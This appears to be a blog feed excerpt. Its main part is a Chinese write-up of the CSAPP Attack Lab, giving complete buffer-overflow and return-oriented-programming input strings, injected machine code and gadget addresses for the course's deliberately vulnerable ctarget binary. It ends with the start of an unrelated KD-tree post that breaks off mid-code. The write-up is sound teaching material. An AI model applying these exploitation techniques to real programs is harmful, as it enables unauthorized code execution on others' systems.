        <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>学习 <code>GDB</code>与 <code>OBJDUMP</code> 的用法;</li><li>了解如何对没有保证缓冲区溢出安全的程序进行攻击;</li><li>熟悉 <code>x86-64</code> 构架下程序栈和参数传递的运行过程.</li></ul><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>导致程序漏洞的关键为 <code>getbuf</code> 函数:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getbuf</code> 函数在栈中申请了一块 <code>BUFFER_SIZE</code> 大小的空间, 并利用这块空间首地址作为 <code>Gets</code> 函数的参数从标准输入中读取字符. 我们可以通过提供一个超过 <code>BUFFER_SIZE</code> 的字符串来向 <code>getbuf</code> 的栈帧之外写入数据.</p><h2 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>需要重写函数的正常返回地址, 将函数重定向到 <code>touch1</code> 函数.</p><p>首先查看 <code>ctarget</code> 的反汇编代码.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> ctarget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>getbuf</code> 中, <code>%rsp</code> 被减了 <code>0x38</code>, <code>BUFFER_SIZE</code> 大小是 <code>56</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cdb &lt;getbuf&gt;:  401cdb:f3 0f 1e fa          endbr64   401cdf:48 83 ec 38          sub    $0x38,%rsp  401ce3:48 89 e7             mov    %rsp,%rdi  401ce6:e8 b5 02 00 00       callq  401fa0 &lt;Gets&gt;  401ceb:b8 01 00 00 00       mov    $0x1,%eax  401cf0:48 83 c4 38          add    $0x38,%rsp  401cf4:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch1</code> 函数地址是 <code>0x401cf5</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cf5 &lt;touch1&gt;:  401cf5:f3 0f 1e fa          endbr64   401cf9:50                   push   %rax  401cfa:58                   pop    %rax  401cfb:48 83 ec 08          sub    $0x8,%rsp  401cff:c7 05 f3 57 00 00 01 movl   $0x1,0x57f3(%rip)        # 4074fc &lt;vlevel&gt;  401d06:00 00 00   401d09:48 8d 3d f1 25 00 00 lea    0x25f1(%rip),%rdi        # 404301 &lt;_IO_stdin_used+0x301&gt;  401d10:e8 6b f3 ff ff       callq  401080 &lt;puts@plt&gt;  401d15:bf 01 00 00 00       mov    $0x1,%edi  401d1a:e8 f4 04 00 00       callq  402213 &lt;validate&gt;  401d1f:bf 00 00 00 00       mov    $0x0,%edi  401d24:e8 b7 f4 ff ff       callq  4011e0 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路:</p><ul><li>将 <code>getbuf</code> 函数栈上分配的空间填满, 并且在下 <code>8</code> 个字节, 即正常返回地址上填充 <code>touch1</code> 的地址.</li><li><code>getbuf</code> 函数执行 <code>ret</code> 指令后, 会从 <code>%rsp+56</code> 处获取返回地址, 而这块地址被改为 <code>touch1</code> 的地址, 程序返回 <code>touch1</code> 而非 <code>test</code>.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949599.png" alt=""></p><p>现在构建输入字符串: 首先使用 <code>0x00</code> 填充栈上 <code>56</code> 个字节, 然后填充<code>touch1</code>地址, 注意字节序为小端序存储.</p><pre class="line-numbers language-none"><code class="language-none"># 1.txt00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 传递进 <code>%rdi</code> 作为参数, 然后程序流跳转到 <code>touch2</code> 函数.</p><p>我的 <code>cookie</code> 值为 <code>0x36bf93ac</code>, <code>touch2</code> 函数会验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch2</code> 函数地址是 <code>0x401d29</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401d29 &lt;touch2&gt;:  401d29:f3 0f 1e fa          endbr64   401d2d:50                   push   %rax  401d2e:58                   pop    %rax  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路:</p><ul><li>将返回地址设置为注入代码的地址, 选择在栈顶注入, 返回地址则设置为 <code>%rsp</code>.</li><li>将 <code>cookie</code> 值移入 <code>%rdi</code>, 随之被 <code>touch2</code> 作为参数调用.</li><li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用 <code>touch2</code>, 只能先将 <code>touch2</code> 的地址压栈, 并使用 <code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li></ul><p>注入代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.s movq   $0x36bf93ac, %rdipushq  $0x401d29retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">2</span>.slinux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">2</span>.o <span class="token operator">&gt;</span> <span class="token number">2</span>.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到机器代码:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.d2.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:48 c7 c7 ac 93 bf 36 movq   $0x36bf93ac,%rdi   7:68 29 1d 40 00       pushq  $0x401d29   c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需将指令序列 <code>48 c7 c7 ac 93 bf 36 68 29 1d 40 00 c3</code> 注入栈顶. 下面寻找 <code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code>, 使用 <code>gdb</code> 调试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gdb ctarget<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token builtin class-name">break</span> getbuf<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> run <span class="token parameter variable">-q</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> disas<span class="token operator">=</span><span class="token operator">&gt;</span> 0x0000000000401cdb <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:     endbr64    0x0000000000401cdf <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:     sub    <span class="token variable">$0x38</span>,%rsp   0x0000000000401ce3 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:     mov    %rsp,%rdi   0x0000000000401ce6 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    callq  0x401fa0 <span class="token operator">&lt;</span>Gets<span class="token operator">&gt;</span>   0x0000000000401ceb <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    mov    <span class="token variable">$0x1</span>,%eax   0x0000000000401cf0 <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    <span class="token function">add</span>    <span class="token variable">$0x38</span>,%rsp<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi0x0000000000401cdf      <span class="token number">12</span>      <span class="token keyword">in</span> buf.c<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi<span class="token number">14</span>      <span class="token keyword">in</span> buf.c<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p /x <span class="token variable">$rsp</span><span class="token variable">$1</span> <span class="token operator">=</span> 0x55633168<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从而 <code>%rsp</code> 为 <code>0x55633168</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949600.png" alt=""></p><p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址.</p><pre class="line-numbers language-none"><code class="language-none"># 2.txt48 c7 c7 ac 93 bf 36 6829 1d 40 00 c3 00 00 00  &lt;----- 注入代码00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00  68 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 变为字符串并传入 <code>%rdi</code>, 然后程序流跳转到 <code>touch3</code> 函数.</p><p><code>hexmatch</code>函数检查 <code>cookie</code> 和传进来的字符是否匹配.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch3</code> 函数会调用 <code>hexmatch</code> 函数验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果将 <code>cookie</code> 串存放在 <code>getbuf</code> 栈帧中, 注意到 <code>hexmatch</code> 中 <code>char *s = cbuf + random() % 100</code> 可能会覆盖原 <code>getbuf</code> 栈帧, 造成数据丢失, 因此需将 <code>cookie</code> 串存放在 <code>test</code> 栈帧中.</p><p>解题思路:</p><ul><li>将 <code>cookie</code> 转为 <code>16</code> 进制字符串存放在 <code>test</code> 栈帧中.</li><li>将 <code>cookie</code> 串的地址移入 <code>%rdi</code>, 随之被 <code>touch3</code> 作为参数调用 (结合 <code>%rsp</code> 的地址与相对偏移量可确定).</li><li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用 <code>touch3</code>, 只能先将 <code>touch3</code> 的地址压栈, 并使用 <code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li></ul><p><code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code> 为 <code>0x55633168</code>, 字符串 <code>cookie</code> 的 <code>ascii</code> 表示为 <code>33 36 62 66 39 33 61 63 00</code>, 距 <code>%rsp</code> 的偏移量为 <code>0x40</code>, 因此其地址为 <code>0x556331a8</code>. 注入代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.s mov    $0x556331a8, %rdipushq  $0x401e4eretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">3</span>.slinux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">3</span>.o <span class="token operator">&gt;</span> <span class="token number">3</span>.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到机器代码:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.d3.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:48 c7 c7 a8 31 63 55 mov    $0x556331a8,%rdi   7:68 4e 1e 40 00       pushq  $0x401e4e   c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需将指令序列 <code>48 c7 c7 a8 31 63 55 68 4e 1e 40 00 c3</code> 注入栈顶.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949601.png" alt=""></p><p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址, 并保存 <code>cookie</code> 字符串.</p><pre class="line-numbers language-none"><code class="language-none"># 3.txt48 c7 c7 a8 31 63 55 68  &lt;----- 注入代码4e 1e 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0068 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址33 36 62 66 39 33 61 6300                      &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Return-Oriented-Programming-Attacks"><a href="#Return-Oriented-Programming-Attacks" class="headerlink" title="Return-Oriented Programming Attacks"></a>Return-Oriented Programming Attacks</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第二阶段的任务, 把 <code>cookie</code> 值传送到 <code>%rdi</code>, 然后调用 <code>touch2</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p><p>需要的代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %rax       # 将 cookie 存入 %raxmovq %rax, %rdi # 将 cookie 存入 %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>popq %rax</code> 的指令字节为 <code>58</code>，找到了如下函数:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f1d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_439</span><span class="token punctuation">&gt;</span></span>:  401f1d:f3 0f 1e fa          endbr64   401f21:c7 07 58 c3 4c cf    movl   $0xcf4cc358,(%rdi)  401f27:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得出 <code>popq %rax</code> 指令的地址为 <code>0x401f23</code>.</p><p><code>movq %rax, %rdi</code> 的指令字节为 <code>48 89 c7</code>, 找到了如下函数:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f12 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_318</span><span class="token punctuation">&gt;</span></span>:  401f12:f3 0f 1e fa          endbr64   401f16:c7 07 6f 48 89 c7    movl   $0xc789486f,(%rdi)  401f1c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得出 <code>movq %rax, %rdi</code> 指令的地址为 <code>0x401f19</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949602.png" alt=""></p><p>下面构建输入字符串: 首先填充 <code>popq %rax</code> 指令, 注入 <code>cookie</code> 的值, 接着填入 <code>movq %rax, %rdi</code> 指令与 <code>touch2</code> 函数的起始地址.</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0023 1f 40 00 00 00 00 00  &lt;----- popq %raxac 93 bf 36 00 00 00 00  &lt;----- coookie19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi29 1d 40 00 00 00 00 00  &lt;----- touch2 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第三阶段的任务, 把 <code>cookie</code> 字符串的起始地址传送到 <code>%rdi</code>, 然后调用 <code>touch3</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p><p>因为程序使用栈随机化增强安全性能, 只能用栈顶地址 + 偏移量来索引 <code>cookie</code> 字符串的起始地址.</p><p>注意到 <code>farm</code> 中已经存在了一个 <code>add_xy</code> 函数, 可以考虑将 <code>%rsp</code> 传入 <code>%rdi</code>, 将偏移量传入 <code>%rsi</code>, 进而计算出 <code>cookie</code> 字符串的首地址, 并传送到 <code>%rax</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401f5b &lt;add_xy&gt;:  401f5b:f3 0f 1e fa          endbr64   401f5f:48 8d 04 37          lea    (%rdi,%rsi,1),%rax  401f63:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 <code>%rsp</code> 传入 <code>%rdi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movq %rsp, %raxmovq %rax, %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>将偏移量传入 <code>%rsi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %raxmovq %eax, %ecxmovq %ecx, %edxmovq %edx, %esi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最困难的一条指令、也是唯一没有使用 <code>c3</code> 或 <code>90</code> 结尾的 <code>gadget</code> 指令为: 从 <code>%ecx</code> 传入 <code>%esi</code>. </p><p>这一步的指令字节为 <code>89 ca</code>, 而 <code>08 db</code> 为一个<code>nop</code> 指令 <code>orb %bl %bl</code> 的编码, 因此 <code>0x401fe9</code>是一个符合要求的 <code>gadget</code> 地址. </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401fe3 &lt;setval_370&gt;:  401fe3:f3 0f 1e fa          endbr64   401fe7:c7 07 89 ca 08 db    movl   $0xdb08ca89,(%rdi)  401fed:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>计算 <code>cookie</code> 地址, 传入 <code>%rdi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea  (%rdi,%rsi,1),%raxmovq %rax, %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取 <code>%rsp</code> 的指令与 <code>cookie</code> 字符串的存储地址间隔了九条 <code>8</code> 字节指令, 因此偏移量为 <code>0x48</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958223.png" alt=""></p><p>下面构建输入字符串:</p><pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00d3 1f 40 00 00 00 00 00  &lt;----- movq %rsp, %rax19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi23 1f 40 00 00 00 00 00  &lt;----- popq %rax48 00 00 00 00 00 00 00  &lt;----- cookie 字符串偏移量3f 20 40 00 00 00 00 00  &lt;----- movq %eax, %ecxe9 1f 40 00 00 00 00 00  &lt;----- movq %ecx, %edxa9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi5b 1f 40 00 00 00 00 00  &lt;----- lea  (%rdi,%rsi,1),%rax19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi4e 1e 40 00 00 00 00 00  &lt;----- touch3 的起始地址33 36 62 66 39 33 61 6300                       &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nearest Neighbour</title>
      <link href="/2022/11/23/shu-ju-jie-gou-nearest-neighbour/"/>
      <url>/2022/11/23/shu-ju-jie-gou-nearest-neighbour/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-6-Nearest-Neighbour"><a href="#3-6-Nearest-Neighbour" class="headerlink" title="3-6 Nearest Neighbour"></a>3-6 Nearest Neighbour</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题需使用 <code>KD-Tree</code> 数据结构.</p><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 16</span><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token keyword">friend</span> <span class="token keyword">operator</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Node y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>comp<span class="token punctuation">]</span> <span class="token operator">&lt;</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>comp<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> node<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用全局变量 <code>int dimension</code> 记录操作向量的维数, <code>Node</code> 结构体支持存储一个 $k$ 维向量, 其中 $2\le k\le 5$.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 26</span><span class="token keyword">struct</span> <span class="token class-name">Tree</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    Node p<span class="token punctuation">;</span>    <span class="token keyword">bool</span> leftnode <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> rightnode <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> is_leaf <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tree<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> N<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个 <code>Tree</code> 结构体实例对应 <code>KD-Tree</code> 中的一个节点, <code>leftnode</code> 与 <code>rightnode</code> 记录了其是否存在左、右子节点, <code>is_leaf</code> 记录其是否为叶节点.</p><p>每个 <code>Tree</code> 实例内部保存了一个向量 <code>Node p</code>, 而 <code>int v[5][2]</code> 记录了其对应的 <code>KD-Tree</code> 节点集在 $k$ 维空间内覆盖的范围, 其中 <code>v[i][0]</code>, <code>v[i][1]</code> 分别记录了 <code>Tree</code> 节点在空间中第 $i$ 维的范围.</p><h4 id="Euclid-距离"><a href="#Euclid-距离" class="headerlink" title="Euclid 距离"></a>Euclid 距离</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 36</span>ll <span class="token 